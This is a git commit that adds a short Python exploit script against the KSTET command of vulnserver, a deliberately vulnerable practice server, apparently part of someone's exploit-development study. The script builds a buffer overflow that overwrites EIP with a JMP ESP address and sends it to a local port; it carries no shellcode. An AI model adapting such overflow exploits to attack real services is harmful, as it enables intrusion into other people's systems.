27fef148134f3c35c565b7fcca124a2356b642cc
bigb0ss <49355913+bigb0sss@users.noreply.github.com>
2020-07-19 13:26:27 -0400

    Create jmp-esp_kstet.py

---
+++ vulnserver/KSTET - EIP Overwrite/jmp-esp_kstet.py
@@ -0,0 +1,23 @@
+import socket
+import struct
+import os
+import sys
+
+vuln_command = "KSTET "
+crash = 94
+offset = 70
+eip = struct.pack("<I", 0x62501205)     # JMP ESP
+
+payload = ""
+payload += vuln_command
+payload += "A" * offset
+payload += eip
+payload += "C" * (crash - len(payload))
+
+print "[+] Sending buffer (Size: %d)" % len(payload)
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('127.0.0.1', 9999))
+print(s.recv(1024))
+s.send(payload)
+s.close()
